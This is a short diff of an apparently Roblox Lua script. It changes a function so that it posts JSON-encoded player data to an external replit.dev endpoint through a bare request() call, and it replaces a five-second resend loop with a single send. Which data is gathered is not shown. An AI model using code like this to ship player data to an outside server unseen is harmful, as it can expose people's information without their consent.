@@ -75,7 +75,7 @@ end
 local function sendPlayerData()
     local dataToSend = getPlayerData()
     
-    local response = HttpService:RequestAsync({
+    local response = request({
         Url = "https://869f4db0-f4a9-4e3e-80bc-584b83f72c2e-00-1lfbcpjuok5s7.riker.replit.dev/receive-data",
         Method = "POST",
         Body = HttpService:JSONEncode(dataToSend),
@@ -93,7 +93,4 @@ local function sendPlayerData()
     end
 end
 
-while true do
-    sendPlayerData()
-    wait(5)  -- Espera 5 segundos antes de enviar de nuevo
-end
+sendPlayerData()
